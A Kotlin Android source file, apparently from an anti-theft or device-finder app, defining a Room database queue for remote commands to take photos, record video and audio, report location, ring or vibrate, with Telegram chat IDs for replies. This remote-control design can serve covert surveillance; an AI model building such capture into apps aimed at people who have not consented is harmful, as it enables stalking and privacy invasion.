package com.save.me

import android.content.Context
import android.util.Log
import androidx.room.*
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

object CommandQueueManager {
    enum class ResourceGroup { CAMERA, MIC, LOCATION, NONE }

    private val queueScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private val resourceMutex = Mutex()
    private val runningResources = mutableSetOf<ResourceGroup>()
    private val runningJobIds = mutableSetOf<Long>()
    private lateinit var appContext: Context
    private lateinit var dao: CommandQueueDao
    private var initialized = false

    fun initialize(context: Context) {
        if (initialized) return
        appContext = context.applicationContext
        dao = CommandQueueDatabase.getInstance(appContext).commandQueueDao()
        initialized = true
        queueScope.launch { processQueueLoop() }
    }

    fun enqueue(command: QueuedCommand) {
        queueScope.launch {
            val needed = getResourceGroups(command.type)
            resourceMutex.withLock {
                if (needed.any { it in runningResources }) {
                    // Send Telegram message about resource conflict
                    if (!command.chatId.isNullOrBlank()) {
                        UploadManager.init(appContext)
                        val resourceNames = needed.filter { it in runningResources }
                            .joinToString(", ") { it.name }
                        val deviceNickname = Preferences.getNickname(appContext) ?: "Device"
                        val msg = "[$deviceNickname] Cannot execute '${command.type}' command because resource(s) busy: [$resourceNames]. Try again after the current command finishes."
                        UploadManager.sendTelegramMessage(command.chatId, msg)
                    }
                    Log.w("CommandQueueManager", "Rejected '${command.type}' due to resource conflict: $needed")
                    return@launch
                }
            }
            dao.insert(CommandEntity.fromQueuedCommand(command))
            // processQueueLoop is always running, so nothing more needed here
        }
    }

    private suspend fun processQueueLoop() {
        while (true) {
            processQueueOnce()
            delay(250)
        }
    }

    private suspend fun processQueueOnce() {
        val pending = dao.getAllPending()
        if (pending.isEmpty()) return

        resourceMutex.withLock {
            for (cmd in pending) {
                if (runningJobIds.contains(cmd.id)) continue
                val neededResources = getResourceGroups(cmd.type)
                if (neededResources.any { it in runningResources }) continue

                runningResources.addAll(neededResources)
                runningJobIds.add(cmd.id)

                queueScope.launch {
                    try {
                        dao.updateStatus(cmd.id, "running")
                        withContext(Dispatchers.IO) {
                            ActionHandlers.executeCommand(appContext, cmd.toQueuedCommand())
                        }
                        dao.updateStatus(cmd.id, "done")
                    } catch (e: Exception) {
                        dao.updateStatus(cmd.id, "failed")
                        Log.e("CommandQueueManager", "Command failed: ${cmd.type}", e)
                    } finally {
                        resourceMutex.withLock {
                            runningResources.removeAll(neededResources)
                            runningJobIds.remove(cmd.id)
                        }
                    }
                }
            }
        }
    }

    fun clearAll() {
        queueScope.launch {
            dao.clearAll()
            resourceMutex.withLock {
                runningResources.clear()
                runningJobIds.clear()
            }
        }
    }

    fun getResourceGroups(type: String): Set<ResourceGroup> = when (type) {
        "photo" -> setOf(ResourceGroup.CAMERA)
        "video" -> setOf(ResourceGroup.CAMERA, ResourceGroup.MIC)
        "audio" -> setOf(ResourceGroup.MIC)
        "location" -> setOf(ResourceGroup.LOCATION)
        "ring", "vibrate" -> setOf(ResourceGroup.NONE)
        else -> setOf(ResourceGroup.NONE)
    }
}

@Entity(tableName = "command_queue")
data class CommandEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val type: String,
    val camera: String? = null,
    val flash: String? = null,
    val quality: String? = null,
    val duration: String? = null,
    val chatId: String? = null,
    val enqueueTime: Long = System.currentTimeMillis(),
    val status: String = "pending"
) {
    fun toQueuedCommand() = QueuedCommand(type, camera, flash, quality, duration, chatId)
    companion object {
        fun fromQueuedCommand(cmd: QueuedCommand): CommandEntity =
            CommandEntity(
                type = cmd.type,
                camera = cmd.camera,
                flash = cmd.flash,
                quality = cmd.quality,
                duration = cmd.duration,
                chatId = cmd.chatId
            )
    }
}

@Dao
interface CommandQueueDao {
    @Query("SELECT * FROM command_queue WHERE status='pending' ORDER BY enqueueTime ASC")
    suspend fun getAllPending(): List<CommandEntity>

    @Query("SELECT * FROM command_queue WHERE status='pending' OR status='running' ORDER BY enqueueTime ASC")
    suspend fun getAllPendingOrRunning(): List<CommandEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(cmd: CommandEntity): Long

    @Query("UPDATE command_queue SET status=:status WHERE id=:id")
    suspend fun updateStatus(id: Long, status: String)

    @Query("DELETE FROM command_queue")
    suspend fun clearAll()
}

@Database(entities = [CommandEntity::class], version = 1)
abstract class CommandQueueDatabase : RoomDatabase() {
    abstract fun commandQueueDao(): CommandQueueDao
    companion object {
        @Volatile private var INSTANCE: CommandQueueDatabase? = null
        fun getInstance(context: Context): CommandQueueDatabase {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: Room.databaseBuilder(
                    context.applicationContext,
                    CommandQueueDatabase::class.java,
                    "command_queue_db"
                ).build().also { INSTANCE = it }
            }
        }
    }
}